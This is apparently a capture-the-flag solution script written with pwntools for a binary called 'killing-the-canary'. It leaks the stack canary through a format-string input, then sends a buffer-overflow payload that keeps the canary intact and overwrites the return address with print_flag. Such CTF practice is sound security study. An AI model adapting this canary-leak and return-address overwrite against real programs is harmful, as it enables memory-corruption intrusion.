#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])

r.recvuntil(b"What's your name? ")

r.sendline(b"%19$lx") # Canary at position 19

val = r.recvuntil(b"What's your message? ")
log.info(val)

match = re.search(b"Hello, ([0-9a-f]+)", val)
if match:
    canary = int(match.group(1), 16)
    log.success(f"Canary leaked: {canary:#x}")
else:
    log.error("Failed to leak canary - trying to parse differently")
    # Try with 0x prefix
    match = re.search(b"Hello, (0x[0-9a-f]+)", val)
    if match:
        canary = int(match.group(1), 16)
        log.success(f"Canary leaked: {canary:#x}")
    else:
        log.error("Could not find canary")
        exit(1)

print_address = exe.symbols['print_flag']
log.info(f"print_flag address: {print_address:#x}")

payload = b'A' * 72
payload += p64(canary)  # Write canary 
payload += b'B' * 8
payload += p64(print_address)  # Replace return with print call

r.sendline(payload)
r.recvline()
r.interactive()